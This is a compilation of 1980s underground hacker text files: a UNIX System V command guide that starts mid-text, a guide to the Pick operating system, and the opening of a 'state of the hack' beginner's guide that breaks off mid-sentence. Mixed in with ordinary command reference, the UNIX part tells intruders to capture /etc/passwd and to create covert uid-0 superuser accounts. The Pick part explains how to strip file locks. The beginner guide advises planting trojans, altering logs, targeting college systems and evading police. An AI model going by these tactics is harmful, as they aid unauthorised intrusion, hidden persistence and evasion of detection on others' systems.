-rwxr-x--- is read in triples of 3.The first chracter eg(-,d,b,c)-means as
follows: - is an ordinary file ,d is a directory,b is block file,c is a
chracter file.
The r stands for read permission,w is write permission,x is execute.The first
colum is read in 3 triples as stated above.The first group of 3 (in -rwxr-x---)
after the "-" specifies the permission for the owner of the file,the second
triple are for the groups (the fourth colum) and the last triple are the
permissions for all other users.Therefore the -rwxr-x--- is read as follows.
The owner john has permission to read,write and execute anything in the bin
directory but the group has no write permission to it and the rest of the users
have no permission at all.The format of one of the lines in the above output
is as follows:

file type-permissions,links,usersname,group,bytes taken,date,time when last
renued,directory or file name.
**You will be able to read,execute cathys file named party due to the same
group***

chmod
-----
The chmod command changes permission of a directory or a file.Format is
chmod who+,-,=r,w,x
The who is substituted by u-user,g-group,o-other users,a-all.
The + means add permission,- means remove permission,= - assign.
Example :If you wanted all other users to read the file name mail ,type:

$ chmod o+r mail

cat
---
Now suppose you wanted to read the file letter .There are teo ways to doing
this.First go to the michelle directory then type in:

$ cat letter
line one ...X
line two ... the output of letter
line three../
$
   or
If you are in the parent directory type in:
$ cat /usr/john/michelle/letter
and you will have the same output.

Some cat options are  -s,-u,-v,-e,-t

Special Chracters in Unix:
-------------------------
*  - matches any number of single characters eg. ls john* will list
     all files that begin with john
[...] - matchs any one of the chracter in the [ ]
? - matches any single chracter
& - runs a process in the backgroung leaving your terminal free
$ - Values used for variables also $n - null argument
> - redirectes output
< - redirects input to come from a file
>> - redirects command to be added to the end of a file
| - pipe output (eg:who|wc-l tells us how many users are online)
"..." - Turn of meaning of special chracters excluding $,
... - allows command output in to be used in a command line
'...' - turns of special meaning of all chracters

continuation of local commands...[     ] -contains the options used
-------------------------------
passwd
------
Password changing seems to be a big thing among the savants.Anyway to change
the password one would use the 'passwd' command as shown below:

   $passwd
   Changing password for john
   Old password:
   New password:
   Retype new password:
   $

This will only work when the password has aged enough

ps
--
Its sometimes necessary to see what command procesess you are running,this
command lets you see that.
ps [-a all processes except group leaders] [-e all processes] [-f the whole
   list]

   $ps
   PID   TTY  TIME   COMMAND
   200   tty09 14:20  ps

   The systems reports (PID - process idenetification number which is a #
   from 1-30,000 assigned to UNIX processes)
   It also reports the TTY,TIME and the COMMAND being executed at the time.
   To stop a process enter :

   $kill [PID] (this case its 200)
   200 terminated
   $

grep
----
This comand is important when seaching for a word or words in large files.

grep [argument] [file name] - searchs for an file that contains the argument
                              for example:
   $ grep phone cathy
    phone   michelle  (718)5551234
    phone   cindy   (718)5553456

    What this did was to find the argument 'phone' in the file cathy.If the
    argument consists of two or more words then  it must be enclosed in single
    quotes.


mv
--
mv [file names(s)] [ dir name ] - renames a file or moves it to another
                                  directory eg.
   $mv letter letters
   $
   This renames the file letter to letters thereby deleting letter
                  or if you want to move files then
   $mv /usr/john/pers/capital /usr/john/michelle/capital
   $
   This moves the file capital to the directory named michelle

diff
----
diff [file name] [ file name] - show diffrence between two files.Output of this
                                will have something like 4,5c4,5 then the it
                                will display both sets of files on the screen
                                The 4,5c4,5 means that you must change "c"
                                lines 4 to 5 in one file to line 4 to 5 in
                                another.
      Option for using this command are :
       -b  -  it ignores blank spaces
       -h  - compares it quickly
       -s  - reports files that are the same
       -S[file] - this is when you want to compare a directory starting at a
                  specific file


       There is also a command to compare 3 files which is :

       diff3 [options] [file1] [file2] [file3]

cp
--
cp [file name] [file name] - makes a copy of a file

   $ cp letter letters
   $
   The file letters is a dupilcate copy of letter.In this case the original
   is not erased like in the mv command



.... more UNIX commands:
--------------------

man [command] or [c/r] -will give you a list of commands explainations

help - available on some UNIX systems

mkdir [dir name(s)] - makes a directory

rmdir [dir name(s)] - removes directory.You wont be able to remove the
                      directory if it contains files in them

rm [file name(s)] - removes files. rm * will erase all files in the current
                    dir.Be carefull you!!.Some options are :
                    [-f unconditional removal] [-i Prompts user for y or n]

write [login name ] - to write to other logged in users.Sort of a chat

mesg [-n] [-y] - doesn't allow others to send you messages using the write
                 command.Wall used by system adm overrides it.

$ [file name] - to execute any file

wc [file name] - Counts words,chracters,lines in a file

stty [modes] - Set terminal I/O for the current devices

sort [filename] - Sorts and merges files many options

spell [file name] > [file name] - The second file is where the misspelt words
                                  are entered

date [+%m%d%y*] [+%H%%M%S] - Displays date acoording to options

at [-r] [-l] [job] - Does a specified job at a specified time.The -r Removes
                     all previously scheduled jobs.The -l reports the job #
                     and status of all jobs scheduled

write [login] [tty] - Sends message to the login name.Chat!



su [login name]
---------------
The su command allows one to switch user to a super user to a user.Very
important could be used to switch to super user accounts.
Usage:

$ su sysadm
password:

This su command will be monitored in /usr/adm/sulog and this file of all files
is carefully monitered by the system administrator.Suppose you hacked in johns
account and then switched to the sysadm account (ABOVE) your /usr/adm/sulog
entry would look like:

SU  04/19/88  21:00 + tty 12 john-sysadm

Therfore the S.A(system administrator) would know that john swithed to sysadm
account on 4/19/88 at 21:00 hours

Searching for valid login names:
-------------------------------
Type in-
$ who  ( command informs the user of other users on the system)
cathy  tty1  april 19  2:30
john   tty2  april 19  2:19
dipal  tty3  april 19  2:31
:
:
tty is the users terminal,date,time each logged on.dipal,john are valid
logins.

Files worth concatenating(cat)
/etc/passwd file:
-----------------
The etc/passwd is a vital file to cat.For it contains login names of all
users including super user accounts and there passwords.In the newer
SVR3 releases they are tighting their security by moving the encrypted
passwords from /etc/passwd to /etc/shadow making it only readable by root.
This is optional offcourse.

$ cat /etc/passwd
root:D943/sys34:0:1:0000:/:
sysadm:k54doPerate:0:0:administration:usr/admin:/bin/rsh
checkfsys:Locked;:0:0:check file system:/usr/admin:/bin/rsh
:
other super user accs.
:
john:chips11:34:3:john scezerend:/usr/john:
:
other users
:
$
If you have reached this far capture this file as soon as posible.
This is a typical output etc/passwd file.The entries are seperated
by a ":".There made be up to 7 fields in each line.
Eg.sysadm account.
The first is the login name in this case sysadm.The second field contains the
password.The third field contains the user id."0 is the root".Then comes the
group id then the account which contains the user full name etc .The sixth
field is the login directory defines the full path name of the the particlar
account and the last is the program to be executed.
Now one can switch to other super user account using su command descibed above.
The password entry in the field of the checkfsys account in the above example
is "Locked;". This doesn't mean thats its a password but the account
checkfsys cannot be accessed remotely.The ";" acts as an unused encryption
chracter.A space is also used for the same purpose.You will find this in many
UNIX systems that are small systems where the system administrator handles
all maintaince.

Password aging:
---------------
If password aging is active the user is forced to change the password at
regular intervals.One may be able to tell just by looking at the /etc/passwd
file when the password is allowed to be changed and when it is compulsory to
change it.
For example the entry:

john:chips11,43:34:3:John Scezerend:/usr/john:

The password contains an extension of (,43) which mean that john can change has
to change the password atleast evert 6 weeks and can keep it for atleast 3
week.The format used is [password],Mmww.The M is the maxiumum number of weeks
password has to be change and m is the minimum interval password can be changed
and the ww is indicates when the password was last changed.

    Aging chart:
---------|-----------
Character|# of weeks
    .    |  0
    /    |  1
 0-9     | 2-11
 A-Z     | 12-37
 a-z     | 38-63
---------|-----------

>From the above anyone can determine the number of weeks one can chnage the
password.

The (ww) is automatically added as to when the password was last changed .

IF SHAWDOWING IS ACTIVE:
------------------------

If the shawdowing is active the /etc/passwd would look like this:

root:x:0:1:0000:/:
sysadm:x:0:0:administration:/usr/admin:/bin/rsh

The password filed is substituted by "x".

The /etc/shawdow file only readable by root will look similar to
this:

root:D943/sys34:5288::
:
super user accounts
:
Cathy:masai1:5055:7:120
:
all other users
:

The first field contains users id:the second contains the password(The pw will
be NONE if logining in remotely is deactivated):the third contains a code of
when the password was last changed:the fourth and the fifth contains the
minimum and the maximum numbers of days for pw changes(Its rare that you will
find this in the super user logins due to there hard to guess passwords)


/etc/options directory
-----------------------
The etc/options dir will consists of utilities available in the system.
Example:
-rwxr-xr-x   1 root  sys   40 april  1:00  uucp.name
uucp standing for BNU

/etc/group
-----------
The file has each group on the system.Each line will have 4 entries separated
by a ":" . Example of concatenated /etc/group:

root::0:root
adm::2:adm,root
bluebox::70:

Group name:password:group id:login names
** It very unlikely that groups will have passwords assigned to them **
The id "0" is assigned to /

Sending and recieving messages:
-------------------------------
Two programs are used to manage this.They are mail & mailx.The difference
between them is that mailx is more fancier thereby giving you many choices
like replying message ,using editors etc.
Sending:
--------
The basic format for using this command is:

$mail [login(s)]
(now one would enter the text
after finishing enter "." a period
on the next blank line)
$
This command is also used to send mail to remote systems.Suppose you wanted
to send mail to john on a remote called ATT01
you would type in:

$mail ATT01!john

Mail can be sent to several users,just by entering more login name after
issuing the mail command

Using mailx is the same format:(This I'll describe very briefly)
$mailx john
subject:(this lets you enter the subject)
(line #1)
(line #2)
(After you finish enter (D.) not the brackets offcourse ,more commands are
available like Dp,Dr,Dv,Dm,Dh,Db etc.)

Receiving:
----------
After you log on to the system you will the account may have mail waiting.
You will be notified "you have mail".
To read this enter:
$mail
(line #1)
(line #2)
(line #3)
?
$
After the message you will be prompted with a question mark.Here you have a
choice to delete it by entering d,saving it to view it later s,or just press
enter to view the next message.
(DONT BE A SAVANT AND DELETE THE POOR GUYS MAIL)

Super user commands:
--------------------
$sysadm adduser - will take you through a routine to add a user
                 (may not last long)

Enter this:

$ sysadm adduser
password:
(this is what you will see)
/--------------------------------------------------------------------------X
  Process running succommmand adduser
  USER MANAGMENT

  Anytime you want to quit, type "q".
  If you are not sure how to answer any prompt, type "?" for help

  If a default appears in the question,press <RETURN> for the default.

  Enter users full name [?,q]: (enter the name you want)
  Enter users login ID [?,q]:(the id you want to use)
  Enter users ID number (default 50000) [?,q) [?,q]:( press return )
  Enter group ID number or group name:(any name from /etc/group)
  Enter users login home directory:(enter /usr/name)

  This is the information for the new login:
  Users name: (name)
  login ID:(id)
  users ID:50000
  group ID or name:
  home directory:/usr/name
 Do you want to install,edit,skip [i,e,s,q]? (enter your choice if "i" then)
 Login installed
 Do you want to give the user a password?[y,n] (its better to enter one)
 New password:
 Re-enter password:

 Do you want to add another login?
X----------------------------------------------------------------------------/

This is the proccess to add a user.Since you hacked into a super user account
you can make a super user account by doing the following by entering 0 as an
user and a group ID and enter the home directory as /usr/admin.This will give
you as much access as the account sysadm
**Caution** - Do not use login names like Hacker,Cracker,Phreak etc .This is
a total give away.
The process of adding a user wont last very long the S.A will know when he
checks out the /etc/passwd file

$sysadm moduser - This utility allows one to modify users.DO NOT ABUSE!!!
Password:

This is what you'll see:

/----------------------------------------------------------------------------X
MODIFYING USER'S LOGIN

1)chgloginid  (This is to change the login ID)
2)chgpassword (Changing password)
3)chgshell (Changing directory DEFAULT = /bin/sh)

ENTER A NUMBER,NAME,INITIAL PART OF OF NAME,OR ? OR <NUMBER>? FOR HELP,
Q TO QUIT ?
X----------------------------------------------------------------------------/

Try every one of them out.Do not change someones password.It creates a havoc.
If you do decide to change it.Please write the original one down somewhere
and change back.Try not to leave to many traces after you had your fun.
In choice number 1 you will be asked for the login and then the new one.
In choice number 2 you will asked for the login and then supplied by it correct
password and enter a new one.
In choice 3 this is used to a pchange the login shell ** Use full **
The above utilites can be used separatly for eg( To change a password one
coulfd enter: $sysadm chgpasswd not chapassword ,The rest are same)

$sysadm deluser - This is an obviously to delete a user
password:

This will be the screen output:
/---------------------------------------------------------------------------X
Running subcommand 'deluser' from menu 'usermgmt'
USER MANAGEMENT
This fuction completely removes the user,their mail file,home directory
and all files below their home directory from the machine.

Enter login ID you wish to remove[q]:      (eg.cathy)
'cathy' belongs to 'Cathy Franklin'
whose home directory is /usr/cathy
Do you want to remove this login ID 'cathy' ? [y,n,?,q] :

/usr/cathy and all files under it have been deleted.

Enter login ID you wish to remove [q]:
X--------------------------------------------------------------------------/
This command deletes everthing owned by the user.Dont use it even if you have
access to it.



other super user commands:
--------------------------
wall [text] control-d  - to send an anouncement to users logged in(will
                          override mesg -n command).Execute only from /
/etc/newgrp - is used to become a member of a group

sysadm [program name]
        delgroup - delets groups
        whoson - self explanatory
        lsgroup - Lists group
        mklineset -hunts various sequences
        lsuser -lists all the users & their logins names

Other commands may require file system to be mounted.


                       Basic Networking utility(BNU)
                       -----------------------------

The BNU is a unique feature in UNIX.Some systems may not have this installed.
What BNU does is allow other remote UNIXes communicate with yours without
logging off the present one.BNU also allowes file transfer between computers.
Most UNIX systems V will have this feature installed.

The user program like cu,uux etc are located in the /usr/bin directory

Basic Networking Files:
-----------------------
/usr/lib/uucp/[file name]
 [file name]
 systems - cu command to establishes link.Contains info on remote computers
           name,time it can be reached,login Id,password,telephone numbers
 devices - inter connected with systems files(Automatic call unit same in two
           entries)also cantains baud rate,port tty1 etc.

 dialers - where asscii converation must be made before file tranfers etc.
 dialcodes - contains abreiviations for phone numbers that can be used in
             systems file

 other files are sysfiles,permissions,poll,devconfig

B.N.U Aministrative files:
--------------------------
There are 5 admnistrative files present.These are files are created in the
/usr/spool directory .These A.Files are responsible for various BNU procceses
like kepping records data ,files tranfers bettwenn remote and local and also
usefull to lock devices.

TM - This file used to hold temporary data .When tranfering the files from a
     remote to local the /usr/spool/uucp/[name of the remote computer ] creates
     this in the format of as of below:

     TM[Process Identification Number].[ddd]

     The ddd is the a 3 digit number (sequential) starting with "0"
     Here a typical eg: TM322.012
     Then this file is moved into the path defined by the C.sysnxxx file

X.[Execute files] - Created in the /usr/spool before you execute the commands
                    in remote.
                    The format used to name this file is X.sysnxxx
                    where sys stand for the remote name and n is the priority
                    level the xxxx is a sequence assingned by the uucp.These
                    files always contain the Name of the file ,Comuter & file
                    name to recieve,Persons login & computer name and the
                    command string.

LCK - The lock file created in the /usr/spool/locks directory.The is used when
      devices are being used.Prevent usage of the same calling device.

     Format used: LCK.str wher the str is a device name.The Lock file contains
     the PID needed to lock

C.sysnxxx - created in the usr/spool directory.These are the work files.Used
            when work is in line,remote execeutions.Format is same as the
            X.sysnxxxx.The works files contain the full path name of the file
            to be sent,path name of the destination (TM Transfers),Remote login
            name to be notified after the file transmision is complete,Users
            login name and the name of the programs used eg.uucp,uupick etc.

D - The data files.Format used is  D.systmxxxxyyy.These files are created when
    specified in a command to copy to the spool directory.Eg. By the usage of
    uucp -C this will be true.
    The systm is the remote name,xxxx is the the 4 digits seq assingned by
    the uucp.The yyy is a sub sequence number.

Logining on to remote and sending+receiving files
-------------------------------------------------
 cu - This command allows one to log on to the local as well as the remote
      Unix (or a non unix)without haveing to hang up so you can transfer files.
      Usage:[options]

  $ cu [-s baud rate][-o odd parity][-e even parity][-l name of comm line]
       telephone number | systemname

  To view system names that you can communicate with use the 'unname' command:
  Eg. of output of names:

  ATT01
  ATT02
  ATT03
  ATT04


$ cu -s300 3=9872344 (9872344 is the tel#)
 connected
 login:
 password:

local strings:
--------------
<D.> - will log you off the remote terminal but not the local
D! - out you on the local withiout disconnecting the line from remote
<control-d> - puts you back on the remote unix
D%take [file name] - takes a copy of the file name and copies it to the
                     local(the directory which you are in)
"%put [file name] - reverse of above
D$[command] - allows the execution of a command to the local from remote

ct
--
ct allows local to connect to remote.Initiates a getty on a remote terminal.
Usefull when using a remote terminal.BNU has call back feature that allows
the user on the remote who can execute a call back meaning the local can call
the remote.[   ] are options

$ ct [-h prevent automatic hang up][-s bps rate][-wt set a time to call back
     abbrieviated t mins] telephone number

uux
---
To execute commands on a remote (unix to unix)
usage:[  ] are options

$ uux [- use standard output][-n prevent mail notification][-p also use
      standard output] command-string

uucp
----
uucp copies files from ones computer to the home directory
of a user in remote system.This also works when copying files from one
directory to another in the remote.The remote user will be notified by mail.
This command becomes use full when copying files from a remote to your local
system.
The uucp requires the uucico daemon will call up the remote and will perform
file login sequence,file transfer and notify the user by mail.
Daemons are programs runining in the background.The 3 daemons in a Unix are
uucico,uusched,uuxqt.

 Daemons Explained:[nows a good time to explain the 3 daemons]
 ------------------

 uuxqt - Remote execution.This daemon is executed by uudemon.hour started by
         cron.UUXQT searchs in the spool directory for executable file
         named X.file sent from the remote system.When it finds a file X.file
         where it obtains process which are to be executed.The next step is
         to find weather the processes are available at the time.The if
         available it checks permission and if everthing is o.k it proceeds
         the background proccess.

 uucico - This Daemon is very immportant for it is responsible in establishing
          a connection to the remote also checks permission,performs login
          procedures,transfers + executes files and also notifies the user
          by mail.This daemon is called upon by uucp,uuto,uux commands.

 uusched - This is executed by the shell script called uudemon.hour
           This daemons acts as a randomizer before the UUCICO daemon is
           called.


Usage of uucp command:

$ uucp [options] [first full path name!] file [destination path!] file
example:
$ uucp -m -s bbss hackers unix2!/usr/todd/hackers

What this would do is send the file hackers from your computer to the remotes
/usr/todd/hackers making hackers offcourse as file.todd would mail that
a file has been sent to him.The unix2 is the name of the remote.
Options for uucp:(Dont forget to type in remotes name unix2 in case)
-c  dont copy files to spool directory
-C  copy to spool
-s[file name] - this file will contain the file status(above is bbss)
-r  Dont start the comm program(uucico) yet
-j  print job number(for above eg.unix2e9o3)
-m  send mail when file file is complete

Now suppose you wanted to receive file called kenya which is in the usr/dan/usa
 to your home directory /usr/john assuming that the local systems name is
ATT01 and you are currently working in /usr/dan/usa,you would type in:

$uucp kenya ATT01!/usr/john/kenya

uuto
----
The uuto command allows one to send file to remote user and can also be used
to send files locally.
Usage:
$ uuto [file name] [system!login name]( omit systen name if local)



Conclusion:
-----------
Theres always more one can say about the UNIX but its time to stop.
I hope you have enjoyed the article.I apologize for the lenght. I hope I
made the UNIX operating system more familiar.
Remember do not abuse any systems you hack into for a true hacker doesn't like
to reck but to learn.

                     Guide to The Pick Operating System
                     ----------------------------------
                              Mr. Slippery

                  Phreakers/Hackers Underground Network (c)

-------------
Introduction:
-------------
This is an unfamiliar operating system to many in spite of its
being wide spread. It was created by Dick Pick (no kidding) a
number of years ago and can now be found on everything from
IBM PC's through mainframes. One reason it is unfamiliar is
that it has been sold under a number of names such as Mentor,
Ultimate and Reality. It resembles a data base management
system and is also sold as a DBMS on top of MSDOS as Revelation,
as well as running as an application on UNIX and VM/CMS. Its also
unfamiliar to many since its basically sold to do business
functions like accounting in small to medium size businesses and
is therefore less likely to be found by people such as those
reading this article :-)

This is a bare-bones introduction to the system. It does not
include details on the languages nor specific system manager
functions such as how to stop and restart the system. Also, there
is a new version out, open access, that I don't know anything
about. Its supposed to allow for easier integration of Pick with
other operating systems, such as UNIX.

--------------------
Structure of System:
--------------------
Everything outside of the basic operating system (ABS for
absolute addresses) is based on items in files. Even files are
items in other files. The system is laid out in a four level
hierarchy:


                          ----------
                          - SYSTEM -     (user accounts)
                          ----------
                          /    |    X
                         /     |     X
            ------------- --------   ---------
            -     Master- -M/DICT-   -  MD   -  (synonyms for user)
            - Dictionary- -      -   -       -  (account level    )
            ------------- --------   ---------

The System Dictionary (SYSTEM) is a file that contains the user
accounts and passwords. It points to the user's master dictionary
which contains pointers to the dictionary parts of the user's
files and also has commands (VERBS), dictionary defining items
and procedures (PROCS). The data files are divided into two
pieces the dictionary which points to the data portion and
contains items that can be used to retrieve items from the data
portion of the file.

The structure is more complicated as some of these files can
point to themselves and you can therefore have 'one level' data
files.

Each file has ITEMS in it. These items are always in ASCII format
even the numbers so all DICTIONARIES and DATA files can be
displayed and edited. Each ITEM is composed of ATTRIBUTES (what
is typically called fields). The key is called the "ITEM-ID".
Attributes can have multiple values which may also have multiple
subvalues. A danger in the ability to edit everything is that you
can edit the file pointers and make them point at garbage.

This will cause what is known as a "group format error" which is
a phrase meaning that the operating system says your files are
garbaged.

Certain files have predefined DICTIONARY items. For example the
M/DICT first ATTRIBUTE is the D/CODE which tells what kind of
item is in the M/DICT. An "A" is an ATTRIBUTE defining item, "D"
is a file defining item, "P" is a verb, "PQ" is a PROC, "Q" is a
file synonym item and so forth.

-------------------
Command Processors:
-------------------
The languages you find are an extended BASIC, a retrieval
language called ACCESS, ENGLISH and other names depending on
which version of PICK you have and an interpreted procedure
language called PROC. The command interpreter is called TCL for
Terminal Control Language.

-------------------------------
How to recognize a PICK system:
-------------------------------
The prompt you get is typically "LOGON PLEASE: ". There will
always be a "SYSPROG" (system programmer) account and this one
has the highest privileges. If you have your user-id wrong, it
will say "USER_ID?" followed by the LOGON PLEASE prompt. If you
have a bad password, it will prompt "PASSWORD?" followed by the
logon prompt.

---------------------------------
How to see what is on the system:
---------------------------------
Once you are on, you can see what accounts there are by saying
"LIST ONLY DICT SYSTEM". Besides SYSPROG, you will see POINTER-
FILE (items pointing to binary data strings), SYSPROG-PL (system
maintenance PROCS, NEWAC (new account template), ACC (accounting
history file), ERRMSG (system error messages), PROCLIB (PROC
library) and BLOCK-CONVERT (format of characters printed by use
of the BLOCK-PRINT command)

To see the files you can type "LIST ONLY MD WITH D/CODE "D]" or
LISTFILES (which is a PROC). LISTVERBS and LISTPROCS will tell
you what commands are available.

------------------------
Common Commands (VERBS):
------------------------
AS           - Assembler
BLOCK-PRINT  - Print letters as blocks
CHARACTERS   - Print ASCII character set
CHARGES      - Total time logged on and CPU activity stats

WHAT         - Displays system configuration
WHERE        - Current information on processes
WHO          - Display your account name (WHO * is for all)

--------------
File creation:
--------------
CREATE-FILE filename dictmod,dictsep datamod,datasep
modulo or mod is the number of contiguous disk groups allocated
for a given file and separation is the size of a group. Typically
the separation is set to 1. Deleting a file: "DELETE-FILE filename"

----------------
Copying an item:
----------------
"COPY FILE ITEM <CR>"
The machine will print: TO:
Enter: (optional file) item. Here if you want to copy an item to
another name in the same file leave off the filename else put in
the file name you want. To delete an item type: "DELETE file item".

----------------------
Access/Recall/English:
----------------------
To look at an item you can either use the editor or the retrieval
processor. The two basic commands are LIST and SORT. SORT sorts
the file and then does a LIST. To see what dictionary items (such
as "SALARY" exist for a file, type "LISTDICTS filename".

The structure of the retrieval command is:

COMMAND FILE-NAME SELECTION-CRITERIA SORT-CRITERIA OUTPUT-CRITERIA

An example is "LIST PAYROLL WITH SALARY > "10000"
Another is    "SORT M/DICT BY D/CODE"

-------
Editor:
-------
Pick has a fairly simple text editor. You call it up by typing
"ED Filename Itemname". Commands include DEn (delete n lines),
EX (exit, don't save), FI (file item), Ln (list n lines), Gn
(go to line number 'n'), R/a/b (replace 'a' with 'b') and X
(cancel last command). 'I' puts you in insert mode; a <cr> as the
first character in the line terminates insert mode.

------
BASIC:
------
Mostly you program the system in a very extended version of
BASIC. After editing in your program, you have to compile it by
typing "BASIC file item". Actually its not a compilation into
machine code. It compiles into a meta-code like some versions of
PASCAL compile into P-code. To execute the program, type "RUN
file item". Some programs are "cataloged" which means that an item
is stored in a special format and a pointer with the name of the
program written in the master dictionary so all you have to do is
type the name of the program instead of "RUN file item".

Some of the commands are familiar like "GOTO", "GOSUB" and "FOR"
while many are unique to Pick like those dealing with opening,
reading and writing to files. Pick Basic has a number of neat
things in it like conversion between ascii and ebcdic which is
useful for dealing with stuff from an IBM mainframe.

-----
PROC:
-----
Proc is the stored procedure langage. The first line of all of
them begin with "PQ". Some versions have a different language so
you might also see "PQN". PROCs have subroutine calls shown by
parenthese () or brackets []. Some commands: C - comment, G - go
to a linenumber, IF - Test, IP - input from terminal, O - output
text to terminal, P - process commands in output buffer, RI -
reset input buffers to null, T - terminal output with special
functions like screen clear and X - exit PROC. The processor has
two input buffers and two output buffers and if you want to know
more you should consult a PROC manual or book.

----
TCL:
----
Many commands take options of (N) for do not stop between pages
and (P) for send data to the line printer. For example: "COPY foo
bar (n,t)" means copy item 'bar' from file 'foo' to the terminal and
do not stop between pages.

There are a number of useful terminal control characters:
Control-H - Backspace a character
  "    -I - Tab
  "    -Q - XON (restart output - after XOFF)
  "    -R - Retype last line
  "    -S - XOFF (stop output)
  "    -W - Backspace a word
  "    -X - Cancel current input line

--------------
Communication:
--------------
Pick is not a good communicator. The vast majority of systems are
stand-alone running a canned application. Some of the vendors
have added some file transfer and networking functions, but
typically this is done by another OS when Pick is a guest (such
as VM and UNIX).

-----------
Privileges:
-----------
The Pick system has 3 privilege levels. The lowest does not allow
the user to update the master dictionary or use the tape drive.
The second does not allow the use of interesting parts of the
debugger and certain system maintenance commands. The highest
allows full privileges.

---------
Security:
---------
The system has very little security. Any intermediate hacker can
break thru it very easily. You don't have to be elite. Its based
on codes put in attributes 5 and 6 of file defining items. The
retrieval lock is put in attribute 5 and the update lock in
attribute 6. When you logon, the values in attributes 5 and 6 of
your account are stored and compared against any file you want to
access. A match and your in otherwise you'll get a message that
says the file is access protected.

You put security on a file by editing the file defining items
which means that if you can edit the 'D'-pointer, you can add and
remove the security on the items in the file.

By the way, if you think the security section is skimpy its
because there's not much of it. In earlier versions of the system
the passwords were not even encrypted and anyone could get at
them if they had a little knowledge and access to the editor!

------------------------------
System Messages (ERRMSG) file:
------------------------------
The messages the system prints out are stored in a file, ERRMSG.
So if you are tired of a message like "THE WORD 'item' is
ILLEGAL", all you have to do is "ED ERRMSG 5" and say whatever
you like.

-----------------
That's all Folks:
-----------------
There are a few books on the operating system. A WELL equipped
bookstore will have some. One source (at least according to the
documentation I have is JES & Associates, PO Box 19274, Irvine,
CA 92714; phone (714) 786-2211.

Introduction: The State of the Hack
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
   After surveying a rather large g-file collection, my attention was drawn to
the fact that there hasn't been a good introductory file written for absolute
beginners since back when Mark Tabas was cranking them out (and almost
*everyone* was a beginner!)  The Arts of Hacking and Phreaking have changed
radically since that time, and as the 90's approach, the hack/phreak community
has recovered from the Summer '87 busts (just like it recovered from the Fall
'85 busts, and like it will always recover from attempts to shut it down), and
the progressive media (from Reality Hackers magazine to William Gibson and
Bruce Sterling's cyberpunk fables of hackerdom) is starting to take notice
of us for the first time in recent years in a positive light.
   Unfortunately, it has also gotten more dangerous since the early 80's.
Phone cops have more resources, more awareness, and more intelligence that they
exhibited in the past.  It is becoming more and more difficult to survive as
a hacker long enough to become skilled in the art.  To this end this file
is dedicated .  If it can help someone get started, and help them survive
to discover new systems and new information, it will have served it's purpose,
and served as a partial repayment to all the people who helped me out when I
was a beginner.

Part One: The Basics
DDDDDDDDDDDDDDDDDDDD
    As long as there have been computers, there have been hackers.  In the 50's
at the Massachusets Institute of Technology (MIT), students devoted much time
and energy to ingenious exploration of the computers.  Rules and the law were
disregarded in their pursuit for the 'hack'.  Just as they were enthralled with
their pursuit of information, so are we.  The thrill of the hack is not in
breaking the law, it's in the pursuit and capture of knowledge.
    To this end, let me contribute my suggestions for guidelines to follow to
ensure that not only you stay out of trouble, but you pursue your craft without
damaging the computers you hack into or the companies who own them.

I.    Do not intentionally damage *any* system.
II.   Do not alter any system files other than ones needed to ensure your
      escape from detection and your future access (Trojan Horses, Altering
      Logs, and the like are all necessary to your survival for as long as
      possible.)
III.  Do not leave your (or anyone else's) real name, real handle, or real
      phone number on any system that you access illegally.  They *can* and
      will track you down from your handle!
IV.   Be careful who you share information with.  Feds are getting trickier.
      Generally, if you don't know their voice phone number, name, and
      occupation or haven't spoken with them voice on non-info trading
      conversations, be wary.
V.    Do not leave your real phone number to anyone you don't know.  This
      includes logging on boards, no matter how k-rad they seem.  If you
      don't know the sysop, leave a note telling some trustworthy people
      that will validate you.
VI.   Do not hack government computers.  Yes, there are government systems
      that are safe to hack, but they are few and far between.  And the
      government has inifitely more time and resources to track you down than
      a company who has to make a profit and justify expenses.
VII.  Don't use codes unless there is *NO* way around it (you don't have a
      local telenet or tymnet outdial and can't connect to anything 800...)
      You use codes long enough, you will get caught.  Period.
VIII. Don't be afraid to be paranoid.  Remember, you *are* breaking the law.
      It doesn't hurt to store everything encrypted on your hard disk, or
      keep your notes buried in the backyard or in the trunk of your car.
      You may feel a little funny, but you'll feel a lot funnier when you
      when you meet Bruno, your transvestite cellmate who axed his family to
      death.
IX.   Watch what you post on boards.  Most of the really great hackers in the
      country post *nothing* about the system they're currently working
      except in the broadest sense (I'm working on a UNIX, or a COSMOS, or
      something generic.  Not "I'm hacking into General Electric's Voice Mail
      System" or something inane and revealing like that.)
X.    Don't be afraid to ask questions.  That's what more experienced hackers
      are for.  Don't expect *everything* you ask to be answered, though.
      There are some things (LMOS, for instance) that a begining hacker
      shouldn't mess with.  You'll either get caught, or screw it up for
      others, or both.
XI.   Finally, you have to actually hack.  You can hang out on boards all you
      want, and you can read all the text files in the world, but until you
      actually start doing it, you'll never know what it's all about.  There's
      no thrill quite the same as getting into your first system (well, ok,
      I can think of a couple of bigger thrills, but you get the picture.)

   One of the safest places to start your hacking career is on a computer
system belonging to a college.  University computers have notoriously lax
security, and are more used to hackers, as every college computer depart-
ment has one or two, so are less likely to press charges if you should
be detected.  But the odds of them detecting you and having the personel to
committ to tracking you down are slim as long as you aren't destructive.
   If you are already a college student, this is ideal, as you can legally
explore your computer system to your heart's desire, then go out and look
for similar systems that you can penetrate with confidence, as you're already
familar with them.
   So if you just want to get your feet wet, call your local college.  Many of
them will provide accounts for local residents at a nominal (under $20) charge.
   Finally, if you get caught, stay quiet until you get a lawyer.  Don't vol-
unteer any information, no matter what kind of 'deals' they offer you.
Nothing is binding unless you make the deal through your lawyer, so you might
as well shut up and wait.

Part Two: Networks
DDDDDDDDDDDDDDDDDD
   The best place to begin hacking (other than a college) is on one of the
bigger networks such as Telenet.  Why?  First, there is a wide variety of
computers to choose from, from small Micro-Vaxen to huge Crays.  Second, the
networks are fairly well documented.  It's easier to find someone who can help
you with a problem off of Telenet than it is to find assistance concerning your
local college computer or high school machine.  Third, the networks are safer.
Because of the enormous number of calls that are fielded every day by the big
networks, it is not financially practical to keep track of where every call and
connection are made from.  It is also very easy to disguise your location using
the network, which makes your hobby much more secure.
   Telenet has more computers hooked to it than any other system in the world
once you consider that from Telenet you have access to Tymnet, ItaPAC, JANET,
DATAPAC, SBDN, PandaNet, THEnet, and a whole host of other networks, all of
which you can connect to from your terminal.
   The first step that you need to take is to identify your local dialup port.
This is done by dialing 1-800-424-9494 (1200 7E1) and connecting.  It will
spout some garbage at you and then you'll get a prompt saying 'TERMINAL='.
This is your terminal type.  If you have vt100 emulation, type it in now.  Or
just hit return and it will default to dumb terminal mode.
   You'll now get a prompt that looks like a @.  From here, type @c mail <cr>
